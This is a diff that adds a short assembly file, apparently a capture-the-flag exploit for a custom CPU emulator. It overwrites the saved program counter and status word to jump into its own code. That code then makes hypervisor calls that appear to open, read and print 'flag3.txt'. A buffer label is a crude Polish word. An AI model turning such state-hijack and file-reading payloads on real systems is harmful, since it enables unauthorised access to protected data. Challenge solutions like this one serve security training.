@@ -1,0 +1,50 @@
+ORG #+0---0-0-
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE h4x # proc_pc
+BYTE #000000-00 # proc_psw
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE 1
+BYTE 1
+h4x:
+	ST	@0, [chuj]
+	MOV	@1, fl
+	MOV	@2, 3
+	HVC	1
+	HVC	4
+	MOV	@2, @1
+	MOV	@1, @0
+	MOV	@3, @0
+	HVC	3
+	MOV	@1, @0
+	MOV	@2, 3
+	HVC	1
+	MOV	@1, 3
+	HVC	0
+fl:
+	BYTE	'f'
+	BYTE	'l'
+	BYTE	'a'
+	BYTE	'g'
+	BYTE	'3'
+	BYTE	'.'
+	BYTE	't'
+	BYTE	'x'
+	BYTE	't'
+chuj:
